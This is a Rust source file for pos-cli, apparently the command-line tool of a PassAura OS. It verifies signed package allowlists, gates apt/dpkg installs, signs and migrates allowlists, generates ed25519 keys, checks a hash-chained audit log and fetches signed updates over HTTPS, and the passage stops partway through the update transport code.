// pos-cli — PassAura OS command-line tool.
//
// Subcommands:
//   verify  <allowlist.json> --keyring <keyring.json>      (v2 only)
//   install <package> --allowlist <file> --dry-run          (v2 only)
//   sign    <unsigned v2 allowlist> --private-key <file> --out <file>
//   allowlist-migrate --from-v1 <text-v1 file> --trusted-key <keyring.json>
//                     --sha256-map <map.json> --out <new file>   (offline, one way)
//   keygen  --out <dir>
//
// Exit codes: 0 ok, 2 verification failed, 3 not allowed, 4 usage.
// No panics on malformed input: every fallible path returns a Result and is
// mapped to an exit code. clap handles usage errors (exit 4 via try_parse).

use std::path::PathBuf;
use std::process::ExitCode;
use std::time::{SystemTime, UNIX_EPOCH};

use clap::{Parser, Subcommand, ValueEnum};

use pos_gate::Keyring;

#[derive(Clone, Copy, PartialEq, Eq, ValueEnum)]
enum RecoverMode {
    Retry,
    Abandon,
}

#[derive(Parser)]
#[command(
    name = "pos-cli",
    about = "PassAura OS: verify signed allowlists and gate package installs",
    version,
    disable_help_subcommand = true
)]
struct Cli {
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum AuditCmd {
    /// Check the hash chain. Exit 0 ok, 2 tampered/corrupt, 3 unreadable.
    Verify { file: PathBuf },
    /// Print the last N records (default 10).
    Tail {
        file: PathBuf,
        #[arg(short = 'n', default_value_t = 10)]
        n: usize,
    },
}

fn cmd_audit(action: AuditCmd) -> ExitCode {
    use pos_core::audit::{AuditLog, SystemClock};
    let (file, tail) = match &action {
        AuditCmd::Verify { file } => (file, None),
        AuditCmd::Tail { file, n } => (file, Some(*n)),
    };
    let log = match AuditLog::load_from_file(file, SystemClock) {
        Ok(l) => l,
        Err(e) if e.kind() == std::io::ErrorKind::InvalidData => {
            eprintln!("audit log INVALID: {e}");
            return ExitCode::from(2);
        }
        Err(e) => {
            eprintln!("error: cannot read {}: {e}", file.display());
            return ExitCode::from(3);
        }
    };
    match tail {
        None => {
            println!(
                "audit chain OK: {} records (head {})",
                log.records().len(),
                log.head_hash()
            );
            println!("note: a hash chain cannot show that the newest records were not removed.");
        }
        Some(n) => {
            let r = log.records();
            for rec in &r[r.len().saturating_sub(n.max(1))..] {
                println!("{} {} {:?} {}", rec.seq, rec.timestamp, rec.event, rec.hash);
            }
        }
    }
    ExitCode::SUCCESS
}

#[derive(Subcommand)]
enum Cmd {
    /// Verify an allowlist against a keyring.
    Verify {
        /// Path to allowlist.json
        allowlist: PathBuf,
        /// Path to keyring.json
        #[arg(long)]
        keyring: PathBuf,
        /// Rollback state file (v2 allowlists only); rejects older sequences.
        #[arg(long)]
        state: Option<PathBuf>,
    },
    /// Check whether a package is allowed, and optionally dry-run install.
    Install {
        /// Package name (e.g. "ripgrep")
        package: String,
        /// Path to allowlist.json
        #[arg(long)]
        allowlist: PathBuf,
        /// Path to keyring.json (the allowlist signature is verified first)
        #[arg(long)]
        keyring: PathBuf,
        /// Show what would happen without installing.
        #[arg(long)]
        dry_run: bool,
        /// Rollback state file (v2 allowlists only); updated after a real install.
        #[arg(long)]
        state: Option<PathBuf>,
        /// Install this LOCAL .deb file. Its SHA-256 must equal the signed
        /// allowlist entry for the package. No network.
        #[arg(long)]
        package_file: Option<PathBuf>,
        /// Hash-chained audit log; required for --package-file installs and --recover.
        #[arg(long)]
        audit_log: Option<PathBuf>,
        /// Resolve an unresolved earlier attempt. No default: pick one.
        /// `retry` may REPEAT package maintainer-script side effects.
        /// `abandon` undoes nothing and does not advance the sequence.
        #[arg(long, value_enum)]
        recover: Option<RecoverMode>,
    },
    /// Convert a legacy text-v1 allowlist to an UNSIGNED v2 document (offline, one way).
    ///
    /// The v1 signature is verified with the old rules against --trusted-key
    /// (never a key from the document). The operator supplies the sha256 of every
    /// entry in --sha256-map (JSON object "name@version" -> hex); only the format
    /// is checked, not that it matches the real application file. The output
    /// has sequence 0 and fails verification until signed with `sign`.
    AllowlistMigrate {
        /// Legacy text-v1 allowlist file
        #[arg(long)]
        from_v1: PathBuf,
        /// Trusted keyring.json (the signer must be in it)
        #[arg(long)]
        trusted_key: PathBuf,
        /// JSON object mapping name@version to sha256 (lowercase hex)
        #[arg(long)]
        sha256_map: PathBuf,
        /// New output file; an existing file is never overwritten
        #[arg(long)]
        out: PathBuf,
    },
    /// Sign an UNSIGNED v2 allowlist (signature_hex is overwritten; the key must match signed_by).
    Sign {
        /// Path to the allowlist.json to sign
        allowlist: PathBuf,
        /// Path to private-key.json written by keygen
        #[arg(long)]
        private_key: PathBuf,
        /// Output path for the signed allowlist
        #[arg(long)]
        out: PathBuf,
    },
    /// Verify or show an audit log (JSON lines, hash-chained).
    Audit {
        #[command(subcommand)]
        action: AuditCmd,
    },
    /// Generate a fresh ed25519 keypair into a directory.
    Keygen {
        /// Output directory (created if missing).
        #[arg(long)]
        out: PathBuf,
    },
    /// Check a channel for a signed update, stage it, and install its .deb
    /// artifacts. The transport is a local directory or an HTTPS URL. See
    /// docs/UPDATE_CLIENT_DESIGN.md, docs/UPDATE_INSTALL_HANDOFF.md and
    /// docs/UPDATE_TRANSPORT_HTTPS.md.
    Update {
        /// Channel name (e.g. "stable")
        #[arg(long)]
        channel: String,
        /// Transport directory: the signed envelope is DIR/<channel>.json and
        /// each artifact is DIR/<artifact name>. Pass this or --transport-url.
        #[arg(long)]
        transport_dir: Option<PathBuf>,
        /// HTTPS base URL of an update server: the signed envelope is
        /// URL/<channel>.json and each artifact is URL/<artifact name>. https
        /// only, no redirects, no proxies, size-capped responses. Pass this or
        /// --transport-dir.
        #[arg(long)]
        transport_url: Option<String>,
        /// Update keys JSON: {"keys":[{key_id,public_key_hex,valid_from,valid_until,retired}]}.
        /// These authorize fetching and staging only, never an install.
        #[arg(long)]
        update_keys: PathBuf,
        /// Number of distinct update signatures required (k-of-n)
        #[arg(long)]
        threshold: usize,
        /// Install keyring.json; only allowlists signed by these keys
        /// authorize a .deb install
        #[arg(long)]
        keyring: PathBuf,
        /// Install rollback state file (v2 allowlists)
        #[arg(long)]
        state: PathBuf,
        /// Hash-chained audit log
        #[arg(long)]
        audit_log: PathBuf,
        /// Directory for per-channel accepted-manifest state (created if missing)
        #[arg(long)]
        update_state_dir: PathBuf,
        /// Verify and stage, print what WOULD be installed, then stop.
        /// Installs nothing and persists nothing.
        #[arg(long)]
        dry_run: bool,
    },
    /// Store pre-review checks on a submitted .deb: submission hash binding,
    /// package identity, safe names, and maintainer-script heuristics.
    /// Store-side tooling; see docs/STORE_REVIEW_MODEL.md.
    /// Exit 0 pass, 2 check failure, 4 usage error.
    ReviewCheck {
        /// Path to the submitted .deb
        #[arg(long)]
        deb: PathBuf,
        /// SHA-256 the submission binds (64 lowercase hex)
        #[arg(long)]
        sha256: String,
        /// Package name the submission declares
        #[arg(long)]
        name: String,
        /// Version the submission declares; exact match required when given
        #[arg(long)]
        version: Option<String>,
    },
    /// Publish an approved store submission: re-hash the artifact (refuse on
    /// any swap), read its identity, and write the release pair
    /// OUT/<name>-<version>.deb and an UNSIGNED OUT/<name>-<version>.allowlist.json.
    /// The owner signs the allowlist offline with `pos-cli sign`; this tool
    /// never sees the release key. See docs/STORE_REVIEW_MODEL.md section 8.
    StorePublish {
        /// Path to the approved .deb artifact
        #[arg(long)]
        deb: PathBuf,
        /// SHA-256 the approved submission binds (64 lowercase hex)
        #[arg(long)]
        submission_sha256: String,
        /// Install keyring.json holding the release key's public half
        #[arg(long)]
        keyring: PathBuf,
        /// key_id of the release key that will sign (must be in the keyring)
        #[arg(long)]
        key_id: String,
        /// Allowlist sequence (monotonic per device state; the owner assigns it)
        #[arg(long)]
        sequence: u64,
        /// Days the signed allowlist stays valid [default: 30]
        #[arg(long, default_value_t = 30)]
        lifetime_days: u64,
        /// Release output directory (created if missing; never overwrites)
        #[arg(long)]
        out: PathBuf,
    },
}

fn now_secs() -> u64 {
    // Fail-closed: if the clock is before the epoch, return 0. An allowlist
    // with issued_at > 0 will then be rejected as not-yet-valid, which is the
    // safe direction.
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn read_json(path: &PathBuf) -> Result<Vec<u8>, String> {
    std::fs::read(path).map_err(|e| format!("cannot read {}: {}", path.display(), e))
}

/// Parses and verifies a v2 allowlist against the trusted keyring (and optional
/// rollback state). v1 and unknown versions are rejected here.
fn check_v2(
    bytes: &[u8],
    trusted: &Keyring,
    state: Option<&PathBuf>,
    read_only: bool,
) -> Result<pos_gate::allowlist_v2::V2Allowlist, String> {
    use pos_gate::allowlist_v2::{canonical_digest_hex, parse_v2, verify_v2_trusted};
    let doc = parse_v2(bytes).map_err(|e| format!("invalid allowlist: {e}"))?;
    let store = match state {
        // Read-only (dry-run): a missing state file is not created.
        Some(p) if read_only && !p.exists() => None,
        Some(p) => Some(pos_gate::rollback::RollbackStore::open(p).map_err(|e| e.to_string())?),
        None => None,
    };
    let digest = canonical_digest_hex(&doc).map_err(|e| e.to_string())?;
    let stored = store
        .as_ref()
        .filter(|s| s.last_seq() > 0)
        .map(|s| (s.last_seq(), s.last_digest_hex().to_string()));
    verify_v2_trusted(
        &doc,
        trusted,
        now_secs() as i64,
        stored.as_ref().map(|(a, b)| (*a, b.as_str())),
    )
    .map_err(|e| e.to_string())?;
    if let Some(s) = &store {
        s.check_candidate(doc.sequence, &digest)
            .map_err(|e| e.to_string())?;
    }
    Ok(doc)
}

fn cmd_verify(allowlist: PathBuf, keyring: PathBuf, state: Option<PathBuf>) -> ExitCode {
    let keyring_bytes = match read_json(&keyring) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("error: {e}");
            return ExitCode::from(2);
        }
    };
    let allowlist_bytes = match read_json(&allowlist) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("error: {e}");
            return ExitCode::from(2);
        }
    };
    let kr = match Keyring::from_json(&keyring_bytes) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("error: invalid keyring: {e}");
            return ExitCode::from(2);
        }
    };
    match check_v2(&allowlist_bytes, &kr, state.as_ref(), false) {
        Ok(d) => {
            println!("ok: v2 allowlist verified (sequence {})", d.sequence);
            ExitCode::SUCCESS
        }
        Err(e) => {
            eprintln!("verification failed: {e}");
            ExitCode::from(2)
        }
    }
}

struct InstallArgs {
    package: String,
    allowlist: PathBuf,
    keyring: PathBuf,
    dry_run: bool,
    state: Option<PathBuf>,
    package_file: Option<PathBuf>,
    audit_log: Option<PathBuf>,
    recover: Option<RecoverMode>,
}

fn install_exit_code(e: &pos_install::InstallError) -> u8 {
    match e {
        pos_install::InstallError::NotAllowed => 3,
        pos_install::InstallError::InvalidPackageName => 4,
        _ => 2,
    }
}

fn valid_package_identifier(package: &str) -> bool {
    !(package.is_empty()
        || package.starts_with('-')
        || !package
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '+' | '-' | ':')))
}

fn make_pipeline<R: pos_gate::linux_backend::CommandRunner>(
    runner: R,
    state: &std::path::Path,
    audit: &std::path::Path,
    package_file: Option<&PathBuf>,
) -> pos_install::Pipeline<
    pos_gate::linux_backend::AptDpkgBackend<R>,
    pos_install::LocalFileFetcher,
    pos_gate::rollback::StdFileOps,
> {
    pos_install::Pipeline::new(
        pos_install::InstallPaths::new(state, audit),
        pos_gate::linux_backend::AptDpkgBackend::new(runner),
        pos_install::LocalFileFetcher {
            path: package_file.cloned().unwrap_or_default(),
        },
        pos_gate::rollback::StdFileOps,
    )
}

/// The exact-file / recovery paths. Generic over the runner so unit tests use
/// a fake; the real binary passes `ProcessRunner`.
fn run_pipeline_install<R: pos_gate::linux_backend::CommandRunner>(
    runner: R,
    a: InstallArgs,
) -> ExitCode {
    let (state, audit) = match (&a.state, &a.audit_log) {
        (Some(s), Some(l)) => (s.clone(), l.clone()),
        _ if a.dry_run && a.recover.is_none() => (
            a.state.clone().unwrap_or_default(),
            a.audit_log.clone().unwrap_or_default(),
        ),
        _ => {
            eprintln!(
                "error: --package-file installs and --recover need both --state and --audit-log"
            );
            return ExitCode::from(4);
        }
    };
    if a.recover.is_some() && a.dry_run {
        eprintln!("error: --recover cannot be combined with --dry-run");
        return ExitCode::from(4);
    }
    if a.recover.is_none() && a.package_file.is_none() {
        eprintln!("error: this path needs --package-file");
        return ExitCode::from(4);
    }
    let mut pipeline = make_pipeline(runner, &state, &audit, a.package_file.as_ref());

    if a.recover == Some(RecoverMode::Abandon) {
        // Abandon needs neither the allowlist nor the keyring.
        return match pipeline.abandon() {
            Ok(()) => {
                println!("abandoned: the unresolved attempt is closed. Abandon itself uninstalls nothing and does not change the rollback sequence; the stored sequence is whatever it already was (check it, and the package state, by hand).");
                ExitCode::SUCCESS
            }
            Err(e) => {
                eprintln!("error: {e}");
                ExitCode::from(install_exit_code(&e))
            }
        };
    }

    let bytes = match read_json(&a.allowlist) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("error: {e}");
            return ExitCode::from(2);
        }
    };
    let doc = match pos_gate::allowlist_v2::parse_v2(&bytes) {
        Ok(d) => d,
        Err(e) => {
            eprintln!("error: invalid allowlist: {e}");
            return ExitCode::from(2);
        }
    };
    let kr = match read_json(&a.keyring)
        .and_then(|b| Keyring::from_json(&b).map_err(|e| e.to_string()))
    {
        Ok(k) => k,
        Err(e) => {
            eprintln!("error: invalid keyring: {e}");
            return ExitCode::from(2);
        }
    };
    let req = pos_install::Request {
        package: &a.package,
        doc: &doc,
        trusted: &kr,
        now: now_secs() as i64,
    };

    if a.dry_run {
        return match pipeline.dry_run(&req) {
            Ok(r) => {
                println!(
                    "dry-run: would install {} (sequence {}) from {}; nothing was written",
                    r.package, r.sequence, r.source
                );
                ExitCode::SUCCESS
            }
            Err(e) => {
                eprintln!("error: {e}");
                ExitCode::from(install_exit_code(&e))
            }
        };
    }

    let result = if a.recover == Some(RecoverMode::Retry) {
        eprintln!(
            "WARNING: --recover retry runs the install command again. The earlier attempt may have partly or fully \
             run, so package maintainer scripts and other side effects can be REPEATED. Press on only if you checked \
             the package state."
        );
        pipeline.retry(&req)
    } else {
        pipeline.install(&req)
    };
    match result {
        Ok(pos_install::Outcome::Committed { sequence }) => {
            println!("installed: {} (sequence {sequence} recorded)", a.package);
            ExitCode::SUCCESS
        }
        Err(e) => {
            eprintln!("error: {e}");
            ExitCode::from(install_exit_code(&e))
        }
    }
}

/// Runs only `apt-get` or `dpkg`, never through a shell, with a fixed
/// environment and no stdin. Used by the real binary only. It is never run by
/// any test and has not been exercised on a real system.
struct ProcessRunner;

impl pos_gate::linux_backend::CommandRunner for ProcessRunner {
    fn run(
        &mut self,
        program: &str,
        args: &[String],
    ) -> Result<pos_gate::linux_backend::CommandOutput, String> {
        use pos_gate::linux_backend::{CommandOutput, RUNNER_NOT_STARTED_PREFIX};
        use std::process::{Command, Stdio};
        let exe = match program {
            "apt-get" => "/usr/bin/apt-get",
            "dpkg" => "/usr/bin/dpkg",
            other => {
                return Err(format!(
                    "{RUNNER_NOT_STARTED_PREFIX}program {other} is not permitted"
                ))
            }
        };
        // Spawn failure is the ONLY point where non-start is proven. Everything
        // after a successful spawn is an unknown outcome if it fails.
        let child = Command::new(exe)
            .args(args)
            .env_clear()
            .env("PATH", "/usr/sbin:/usr/bin:/sbin:/bin")
            .env("DEBIAN_FRONTEND", "noninteractive")
            .env("LC_ALL", "C")
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .map_err(|e| format!("{RUNNER_NOT_STARTED_PREFIX}spawn failed: {e}"))?;
        let out = child
            .wait_with_output()
            .map_err(|e| format!("wait/read failed after spawn: {e}"))?;
        let tail = |b: &[u8]| {
            let t = String::from_utf8_lossy(b);
            let t = t.trim();
            let start = t.len().saturating_sub(2000);
            let mut i = start;
            while !t.is_char_boundary(i) {
                i += 1;
            }
            t[i..].to_string()
        };
        Ok(CommandOutput {
            success: out.status.success(),
            code: out.status.code(),
            message: tail(&out.stderr),
        })
    }
}

fn cmd_install(a: InstallArgs) -> ExitCode {
    if !valid_package_identifier(&a.package) {
        eprintln!("invalid package identifier: {}", a.package);
        return ExitCode::from(4);
    }
    if a.package_file.is_some() || a.recover.is_some() {
        return run_pipeline_install(ProcessRunner, a);
    }
    if a.audit_log.is_some() {
        eprintln!("error: --audit-log is only used with --package-file or --recover");
        return ExitCode::from(4);
    }
    cmd_install_legacy(a)
}

/// Original behavior, unchanged, except the real state write takes the
/// cooperative state lock and dry-run no longer creates the state file.
fn cmd_install_legacy(a: InstallArgs) -> ExitCode {
    let InstallArgs {
        package,
        allowlist,
        keyring,
        dry_run,
        state,
        ..
    } = a;
    let bytes = match read_json(&allowlist) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("error: {e}");
            return ExitCode::from(2);
        }
    };
    // Reject unreadable / non-v2 input before looking at the keyring.
    if let Err(e) = pos_gate::allowlist_v2::parse_v2(&bytes) {
        eprintln!("error: invalid allowlist: {e}");
        return ExitCode::from(2);
    }
    let kr =
        match read_json(&keyring).and_then(|b| Keyring::from_json(&b).map_err(|e| e.to_string())) {
            Ok(k) => k,
            Err(e) => {
                eprintln!("error: invalid keyring: {e}");
                return ExitCode::from(2);
            }
        };
    // A real install takes the cooperative state lock before the state file is
    // opened (opening creates it), and holds it through the write.
    let _lock = match (&state, dry_run) {
        (Some(sp), false) => {
            match pos_install::lock::StateLock::acquire(sp, std::time::Duration::from_secs(5)) {
                Ok(l) => Some(l),
                Err(e) => {
                    eprintln!("error: {e}");
                    return ExitCode::from(2);
                }
            }
        }
        _ => None,
    };
    let doc = match check_v2(&bytes, &kr, state.as_ref(), dry_run) {
        Ok(d) => d,
        Err(e) => {
            eprintln!("verification failed: {e}");
            return ExitCode::from(2);
        }
    };
    if !dry_run && state.is_none() {
        eprintln!("error: installing requires --state so the rollback sequence is recorded");
        return ExitCode::from(4);
    }
    if !doc.entries.iter().any(|e| e.name == package) {
        eprintln!("not allowed: {package} is not in the allowlist");
        return ExitCode::from(3);
    }

    if dry_run {
        println!("dry-run: would install {package} (allowed)");
    } else {
        if let Some(sp) = &state {
            let digest = pos_gate::allowlist_v2::canonical_digest_hex(&doc).unwrap_or_default();
            let r = pos_gate::rollback::RollbackStore::open(sp).and_then(|mut st| {
                st.refresh_and_check(doc.sequence, &digest)?;
                st.accept_and_persist(doc.sequence, &digest, Some(now_secs() as i64))
            });
            if let Err(e) = r {
                eprintln!("error: cannot record rollback state: {e}");
                return ExitCode::from(2);
            }
        }
        // No installer is connected on this path (use --package-file). The
        // state file records intent only.
        println!(
            "install: {package} is allowed (installer not wired in this build; use --package-file)"
        );
    }
    ExitCode::SUCCESS
}

fn cmd_sign(allowlist: PathBuf, private_key: PathBuf, out: PathBuf) -> ExitCode {
    use ed25519_dalek::{Signer, SigningKey};
    let run = || -> Result<(), String> {
        let mut doc =
            pos_gate::allowlist_v2::parse_v2(&read_json(&allowlist)?).map_err(|e| e.to_string())?;
        let pk: serde_json::Value =
            serde_json::from_slice(&read_json(&private_key)?).map_err(|e| e.to_string())?;
        let hexs = pk
            .get("private_key_hex")
            .and_then(|v| v.as_str())
            .ok_or("private_key_hex missing")?;
        let bytes: [u8; 32] = hex::decode(hexs)
            .map_err(|e| e.to_string())?
            .try_into()
            .map_err(|_| "private key must be 32 bytes")?;
        let sk = SigningKey::from_bytes(&bytes);
        // The key must be the signed_by ring member, or the result could never verify.
        let signer = doc
            .keyring
            .keys
            .iter()
            .find(|k| k.key_id == doc.signed_by)
            .ok_or("signed_by is not in the document keyring")?;
        if signer.public_key_hex != hex::encode(sk.verifying_key().to_bytes()) {
            return Err("private key does not match the signed_by key in the document".into());
        }
        let payload =
            pos_gate::allowlist_v2::canonical_payload_bytes(&doc).map_err(|e| e.to_string())?;
        doc.signature_hex = hex::encode(sk.sign(&payload).to_bytes());
        write_new_file(
            &out,
            &serde_json::to_vec_pretty(&doc).map_err(|e| e.to_string())?,
        )
    };
    match run() {
        Ok(()) => {
            println!("wrote {}", out.display());
            ExitCode::SUCCESS
        }
        Err(e) => {
            eprintln!("error: {e}");
            ExitCode::from(2)
        }
    }
}

/// Creates a NEW file; an existing path (or a symlink to one) is never overwritten.
fn write_new_file(path: &std::path::Path, bytes: &[u8]) -> Result<(), String> {
    use std::io::Write;
    std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(path)
        .and_then(|mut f| f.write_all(bytes))
        .map_err(|e| format!("cannot create {}: {e}", path.display()))
}

/// System directories where an installed PassAura allowlist or state could live.
/// The migration command refuses to write anywhere under them, whether or not the
/// target file exists yet. (The repo defines no single "installed allowlist path",
/// so this is a deny list of its system directories.)
const PROTECTED_DIRS: &[&str] = &[
    "/etc/passaura",
    "/var/lib/passaura",
    "/usr/share/passaura",
    "/usr/lib/passaura",
    "/usr/local/share/passaura",
    "/usr/local/lib/passaura",
];

/// Lexically normalizes an absolute path (removes `.` and `..`) without touching the disk.
fn normalize_abs(p: &std::path::Path) -> Result<PathBuf, String> {
    use std::path::Component;
    let abs = if p.is_absolute() {
        p.to_path_buf()
    } else {
        std::env::current_dir().map_err(|e| e.to_string())?.join(p)
    };
    let mut out = PathBuf::new();
    for c in abs.components() {
        match c {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    Ok(out)
}

/// Decides whether `out` may be created as a NEW output file for `allowlist-migrate`.
/// Refuses: any path under a protected system directory (checked before the file or
/// directory has to exist, on the lexical path and again after resolving symlinks in
/// the parent), any existing path, and any of the command's own input files.
fn check_new_output(out: &std::path::Path, inputs: &[&std::path::Path]) -> Result<(), String> {
    let lexical = normalize_abs(out)?;
    let protected = |p: &std::path::Path| PROTECTED_DIRS.iter().any(|d| p.starts_with(d));
    if protected(&lexical) {
        return Err(format!(
            "{} is in a protected PassAura system directory; choose another output path",
            out.display()
        ));
    }
    let parent = lexical
        .parent()
        .ok_or("output path has no parent directory")?;
    let name = lexical.file_name().ok_or("output path has no file name")?;
    let resolved_parent = std::fs::canonicalize(parent)
        .map_err(|e| format!("output directory {} is not usable: {e}", parent.display()))?;
    let resolved = resolved_parent.join(name);
    let canon_protected: Vec<PathBuf> = PROTECTED_DIRS
        .iter()
        .filter_map(|d| std::fs::canonicalize(d).ok())
        .collect();
    if protected(&resolved) || canon_protected.iter().any(|d| resolved.starts_with(d)) {
        return Err(format!(
            "{} resolves into a protected PassAura system directory",
            out.display()
        ));
    }
    if std::fs::symlink_metadata(&lexical).is_ok() {
        return Err(format!(
            "{} already exists; refusing to overwrite",
            out.display()
        ));
    }
    for i in inputs {
        if let Ok(ci) = std::fs::canonicalize(i) {
            if ci == resolved {
                return Err("output path is the same as an input file".into());
            }
        }
    }
    Ok(())
}

fn cmd_migrate(
    from_v1: PathBuf,
    trusted_key: PathBuf,
    sha256_map: PathBuf,
    out: PathBuf,
) -> ExitCode {
    let run = || -> Result<usize, String> {
        // Check the destination first so a bad --out never leads to a read or a write.
        check_new_output(
            &out,
            &[
                from_v1.as_path(),
                trusted_key.as_path(),
                sha256_map.as_path(),
            ],
        )?;
        let bytes = read_json(&from_v1)?;
        let kr = Keyring::from_json(&read_json(&trusted_key)?)
            .map_err(|e| format!("invalid keyring: {e}"))?;
        let hashes = pos_gate::migrate::parse_sha256_map(&read_json(&sha256_map)?)
            .map_err(|e| e.to_string())?;
        check_new_output(
            &out,
            &[
                from_v1.as_path(),
                trusted_key.as_path(),
                sha256_map.as_path(),
            ],
        )?;
        let v2 = pos_gate::migrate::migrate_text_v1(&bytes, &kr, &hashes, now_secs())
            .map_err(|e| e.to_string())?;
        write_new_file(
            &out,
            &serde_json::to_vec_pretty(&v2).map_err(|e| e.to_string())?,
        )?;
        Ok(v2.entries.len())
    };
    match run() {
        Ok(n) => {
            println!(
                "wrote {} ({n} entries, UNSIGNED v2, sequence 0)",
                out.display()
            );
            println!("note: hashes came from the operator's map; only their format was checked.");
            println!("next: review times/key window, then run `pos-cli sign` before use.");
            ExitCode::SUCCESS
        }
        Err(e) => {
            eprintln!("migration failed: {e}");
            ExitCode::from(2)
        }
    }
}

fn cmd_keygen(out: PathBuf) -> ExitCode {
    use ed25519_dalek::SigningKey;
    use rand::rngs::OsRng;

    if let Err(e) = std::fs::create_dir_all(&out) {
        eprintln!("error: cannot create {}: {e}", out.display());
        return ExitCode::from(2);
    }

    let mut csprng = OsRng;
    let signing = SigningKey::generate(&mut csprng);
    let verifying = signing.verifying_key();

    let private_hex = hex::encode(signing.to_bytes());
    let public_hex = hex::encode(verifying.to_bytes());
    let key_id = format!("ed25519:{}", public_hex.get(..16).unwrap_or(&public_hex));

    let keyring = serde_json::json!({
        "keys": [ { "key_id": key_id, "public_key_hex": public_hex } ]
    });
    let private = serde_json::json!({
        "key_id": key_id,
        "private_key_hex": private_hex,
        "warning": "KEEP THIS FILE SECRET. It can sign allowlists."
    });

    let keyring_path = out.join("keyring.json");
    let private_path = out.join("private-key.json");

    // Never overwrite existing keys: a rerun must not destroy a private key.
    for p in [&keyring_path, &private_path] {
        if p.exists() {
            eprintln!(
                "error: {} already exists; refusing to overwrite",
                p.display()
            );
            return ExitCode::from(2);
        }
    }
    fn write_new(path: &std::path::Path, bytes: &[u8], secret: bool) -> std::io::Result<()> {
        use std::io::Write;
        let mut o = std::fs::OpenOptions::new();
        o.write(true).create_new(true);
        #[cfg(unix)]
        if secret {
            use std::os::unix::fs::OpenOptionsExt;
            o.mode(0o600); // private from the first byte, no chmod window
        }
        let _ = secret;
        o.open(path)?.write_all(bytes)
    }
    if let Err(e) = write_new(
        &keyring_path,
        &serde_json::to_vec_pretty(&keyring).unwrap_or_default(),
        false,
    ) {
        eprintln!("error: cannot write {}: {e}", keyring_path.display());
        return ExitCode::from(2);
    }
    if let Err(e) = write_new(
        &private_path,
        &serde_json::to_vec_pretty(&private).unwrap_or_default(),
        true,
    ) {
        eprintln!("error: cannot write {}: {e}", private_path.display());
        return ExitCode::from(2);
    }

    println!("wrote {}", keyring_path.display());
    println!("wrote {} (keep secret)", private_path.display());
    ExitCode::SUCCESS
}

// ---- update: signed channel update, staged and installed (docs/UPDATE_CLIENT_DESIGN.md)

struct UpdateArgs {
    channel: String,
    transport_dir: Option<PathBuf>,
    transport_url: Option<String>,
    update_keys: PathBuf,
    threshold: usize,
    keyring: PathBuf,
    state: PathBuf,
    audit_log: PathBuf,
    update_state_dir: PathBuf,
    dry_run: bool,
}

#[derive(serde::Deserialize)]
struct UpdateKeysFile {
    keys: Vec<UpdateKeyJson>,
}

#[derive(serde::Deserialize)]
struct UpdateKeyJson {
    key_id: String,
    public_key_hex: String,
    valid_from: u64,
    valid_until: u64,
    retired: bool,
}

/// Local-directory Transport. The manifest is verified before any artifact is
/// fetched, and artifact names are safe names, so these joins cannot escape
/// the directory. No network.
struct DirTransport {
    dir: PathBuf,
}

impl pos_update::flow::Transport for DirTransport {
    fn fetch_manifest(&mut self, channel: &str) -> std::io::Result<Vec<u8>> {
        std::fs::read(self.dir.join(format!("{channel}.json")))
    }
    fn fetch_artifact<'a>(
        &'a mut self,
        _channel: &str,
        artifact: &pos_update::Artifact,
    ) -> std::io::Result<Box<dyn std::io::Read + 'a>> {
        Ok(Box::new(std::fs::File::open(
            self.dir.join(&artifact.name),
        )?))
    }
}

/// Minimal blocking HTTP GET behind UrlTransport, so unit tests substitute a
/// fake without a network.
trait HttpGet {
    /// GETs `url` and returns the body. Implementations must fail on
    /// redirects, non-2xx statuses and bodies over `max_bytes`.
    fn get(&mut self, url: &str, max_bytes: u64) -> std::io::Result<Vec<u8>>;
}

/// ureq-backed HttpGet: rustls with the bundled webpki root store (never the
/// OS store), no redirect following, no proxy use, bounded timeouts, HTTP/1.1.
/// See docs/UPDATE_TRANSPORT_HTTPS.md.
struct UreqGet {
    agent: ureq::Agent,
}

impl UreqGet {
    fn new() -> Self {
        let config = ureq::Agent::config_builder()
            .max_redirects(0)
            .timeout_connect(Some(std::time::Duration::from_secs(10)))
            .timeout_recv_body(Some(std::time::Duration::from_secs(30)))
            .timeout_global(Some(std::time::Duration::from_secs(120)))
            .build();
        UreqGet {
            agent: ureq::Agent::new_with_config(config),
        }
    }
}

impl HttpGet for UreqGet {
    fn get(&mut self, url: &str, max_bytes: u64) -> std::io::Result<Vec<u8>> {
        let mut resp = self.agent.get(url).call().map_err(std::io::Error::other)?;
        // ureq errors on 4xx/5xx but returns a 3xx it may not follow; any
        // non-2xx (redirects included) is a failure here.
        if !resp.status().is_success() {
            return Err(std::io::Error::other(format!(
                "unexpected HTTP status {}",
                resp.status()
            )));
        }
        resp.body_mut()
            .with_config()
            .limit(max_bytes)
            .read_to_vec()
            .map_err(std::io::Error::other)
    }
}

/// Validates and normalizes a --transport-url value. https only; no userinfo,
/// query or fragment (a URL must carry no credentials); trailing slashes are
/// stripped so path joins are predictable.
fn validate_transport_url(url: &str) -> Result<String, String> {
    let rest = url.strip_prefix("https://").ok_or_else(|| {
        "transport URL must use https://; plain http is never accepted".to_string()
    })?;
    if rest.contains('@') {
        return Err("transport URL must not contain userinfo (user@host)".to_string());
    }
    if rest.contains('?') || rest.contains('#') {
        return Err("transport URL must not contain a query string or fragment".to_string());
    }
    let host = rest.split('/').next().unwrap_or_default();
    if host.is_empty() {
        return Err("transport URL has no host".to_string());
    }
    Ok(url.trim_end_matches('/').to_string())
}

/// HTTPS transport for the update flow: URL/<channel>.json for the signed
/// envelope, URL/<artifact name> for payloads (names are safe names, checked
/// before any fetch). The signed manifest remains the only root of trust; TLS
/// is transport, not verification. See docs/UPDATE_TRANSPORT_HTTPS.md.
struct UrlTransport {
    base: String,
    http: Box<dyn HttpGet>,
}

impl pos_update::flow::Transport for UrlTransport {
    fn fetch_manifest(&mut self, channel: &str) -> std::io::Result<Vec<u8>> {
        self.http.get(
